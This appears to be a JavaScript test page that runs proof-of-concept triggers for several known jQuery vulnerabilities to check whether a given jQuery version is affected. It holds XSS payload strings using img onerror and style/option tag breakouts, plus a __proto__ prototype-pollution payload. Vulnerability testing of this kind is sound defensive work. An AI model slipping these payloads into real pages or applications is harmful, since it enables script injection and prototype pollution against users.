function log(txt){
  const p = document.createElement("p");
  p.append(txt);
  document.querySelector('#log').append(p);
}

function error(txt){
  const p = document.createElement("p");
  p.append(txt);
	p.classList.add('error');
  document.querySelector('#log').append(p);
}

window.onerror = function(message, source, lineno, colno, error) {
	error(message, true);
	error(error.stack);
};

const windowAlert = window.alert;

window.alert = function(...args) {
  log(`alert!`);
  // windowAlert(...args);
};

$(document).ajaxError(function(...args) {
	error(`AJAX ERROR! CAN'T TEST FOR CVE! IS SERVER DOWN?`);
	for (let i = 0; i < args.length; i++) {
		error(JSON.stringify(args[i]));
	}
});

function CVE_2012_6708() {
  log('called CVE_2012_6708');
  $("#yee").html(
    $("element[attribute='<img src=\"x\" onerror=\"alert('yee')\" />']").html()
  );
}

function CVE_2015_9251() {
  log('called CVE_2015_9251');
  $.get("http://localhost:4000/jqueryxss", function( content ) {
    // since we are relying on an external resource for this test, guard against regression
    const expectedContentFound = content === "alert(document.domain);";
    if(!expectedContentFound) {
      error(`unexpected content found: '${content}'`);
      error('CVE-2015-9251 CANNOT BE VERIFIED!');
    }
  });
}

function CVE_2019_11358() {

  log('called CVE_2019_11358');

  $.extend(true, {}, JSON.parse('{"__proto__": {"yee": true}}'))

  if({}.yee) {
    log(`{} prototype has been polluted: ${JSON.stringify({}.__proto__)}`);
  }

	// undo the prototype pollution to prevent side effects
	delete Object.getPrototypeOf({}).yee;

}

function CVE_2020_7656() {
  log('called CVE_2020_7656');
  $("#yee").load("xss.html #yee");
}

function CVE_2020_11022() {
  log('called CVE_2020_11022');
  const x1 = `<style><style /><img src=x onerror=alert('yee')>`;
  const x2 = `<img alt="<x" title="/><img src=x onerror=alert('yee')>">`;
  const $yee = $("#yee");
  $yee.html(x1);
  $yee.html(x2);
}

function CVE_2020_11023() {
  log('called CVE_2020_11023');
  const x = `<option><style></option></select><img src=x onerror=alert('yee')></style>`;
  $("#yee").html(x);
}
